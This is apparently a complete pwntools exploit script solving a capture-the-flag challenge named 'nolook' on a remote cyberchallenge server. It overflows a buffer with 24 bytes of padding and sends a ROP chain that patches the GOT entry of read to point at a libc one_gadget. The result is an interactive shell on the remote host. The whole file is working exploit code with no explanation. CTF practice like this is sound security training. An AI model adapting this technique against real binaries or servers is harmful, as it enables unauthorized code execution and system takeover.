#!env python3

from pwn import *

ONE_GADGET = 0x4f2c5 # found with one_gadget
ADD_GADGET = 0x00000000004005af # add qword ptr [r14 + 0x90], r15; ret;
POP_GADGET = 0x0000000000400680 # pop r14; pop r15; ret;

exe = ELF('./nolook')
libc = ELF('./libc-2.27.so')

io = remote('nolook.challs.cyberchallenge.it', 9135)

rop_chain = (
      p64(POP_GADGET)
    + p64(exe.got.read - 0x90)
    + p64((ONE_GADGET - libc.symbols.read) % 2**64)
    + p64(ADD_GADGET)
    + p64(exe.plt.read)
)
io.send(b'a' * 24 + rop_chain)

io.interactive()